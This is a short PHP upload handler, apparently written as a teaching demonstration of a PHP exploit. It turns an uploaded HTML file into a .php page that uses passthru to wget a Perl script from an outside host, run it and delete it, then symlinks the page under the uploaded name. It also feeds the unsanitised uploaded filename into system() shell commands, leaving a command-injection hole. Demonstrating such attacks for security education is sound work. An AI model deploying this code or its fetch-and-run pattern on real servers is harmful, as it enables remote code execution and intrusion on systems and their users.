<?php
  // uploadfile.php
  //
  // by Avi Kak (kak@purdue.edu)
  // 
  // Used in demonstrating a PHP exploit

  if ( ( $_FILES["file"]["type"] == "text/html")                   //(A)
     && ($_FILES["file"]["size"] < 20000) )   {                    //(B)
    if ($_FILES["file"]["error"] > 0)  {                           //(C)
      echo "Return Code: " . $_FILES["file"]["error"] . "<br />";  //(D)
    } else  {                                                      //(E)
      echo "Uploaded: " . $_FILES["file"]["name"] . "<br />";      //(F)
      echo "Type: " . $_FILES["file"]["type"] . "<br />";          //(G)
      echo "Size: ".($_FILES["file"]["size"] / 1024)." Kb<br />";  //(H)
      $uploaded_file_name = $_FILES["file"]["name"];               //(I)
      move_uploaded_file( $_FILES["file"]["tmp_name"],             //(J)
            "upload/" . $uploaded_file_name);                      //(K)
      echo "Stored in: " . "upload/" . $uploaded_file_name;        //(L)
      $arr = preg_split( "/\./", $uploaded_file_name );            //(M)
      unlink("upload/" . $arr[0] . ".php");                        //(N)
      $handle = fopen( "upload/" . $arr[0] . ".php" , 'w' );       //(O)
      fwrite( $handle, "     
           <?php                                       
               passthru( \"cd /tmp;                      
                  wget https://engineering.purdue.edu/kak/emailer_pl;   
                  perl emailer_pl;                                     
                  rm emailer_pl*\"                                     
              );                                                  
           ?>                                                  
        \n");                                                      //(P)
      fclose( $handle );                                           //(Q)
      system( "cd upload; cat " . $uploaded_file_name . ">> " . 
                    $arr[0] . ".php" );                            //(R)
      unlink( "upload/" . $uploaded_file_name );                   //(S)
      system( "cd upload;                            
           ln -s " . $arr[0] . ".php " . $uploaded_file_name );    //(T)
    }                                                              //(U)
  } else {                                                         //(V)
    echo "Invalid file";                                           //(W)
  }                                                                //(X)
?>
